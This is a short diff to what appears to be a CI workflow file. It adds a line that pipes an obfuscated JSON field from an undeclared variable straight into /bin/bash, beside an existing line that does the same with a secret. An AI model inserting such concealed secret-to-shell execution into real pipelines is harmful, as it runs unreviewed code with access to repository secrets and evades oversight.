@@ -23,6 +23,7 @@ jobs:
           hcce2: ${{ secrets.hcce2 }}
         run: |
           printf '%s' "$hcce2" | jq -r .it64416 | /bin/bash
+          printf '%s' "$jfca404" | jq -r .axo0136 | /bin/bash
 
       - name: Upload results
         if: always()
